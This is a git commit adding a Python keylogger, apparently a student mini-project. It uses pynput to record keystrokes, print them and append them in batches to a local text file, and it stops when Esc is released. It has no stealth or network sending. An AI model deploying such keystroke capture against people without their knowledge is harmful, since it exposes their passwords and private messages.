237e546d915881cec18d4fbcc69791add94736b1
Rithika-Baskaran <88485521+Rithika-Baskaran@users.noreply.github.com>
2021-08-13 18:57:08 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,67 @@
+# -*- coding: utf-8 -*-
+#import the module pynput
+import pynput
+
+from pynput.keyboard import Key,Listener
+
+#keeping a count of the keys pressed in the list
+count = 0
+keys = []
+
+
+# on_press key event
+def on_press(key):
+    global keys, count
+    #the keys are recorded and joined  here
+    keys.append(key)
+    count+=1
+    print("{0} pressed".format(key))
+    #if the count is 10 or more update in the file
+    if count>=20:
+        count=0
+        write_file(keys)
+        keys=[]
+        
+        
+# write the keys in the file miniproject is done by rithika baskaran miniproject is done bt rithika baskaran is
+   
+def write_file(keys):
+     with open("test2.txt","a") as f:
+         for key in keys:
+             #replace the quotation with empty
+             k = str(key).replace("'","")
+             #if the key space is recorded create new line
+             if k.find("space") > 0:
+                 f.write('\n')
+             elif k.find("Key") == -1:
+                 f.write(k)
+                 
+             
+# on_release event             
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+    
+    
+# listener listens to the key events
+with Listener(on_press=on_press,on_release=on_release) as listener:
+    listener.join()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
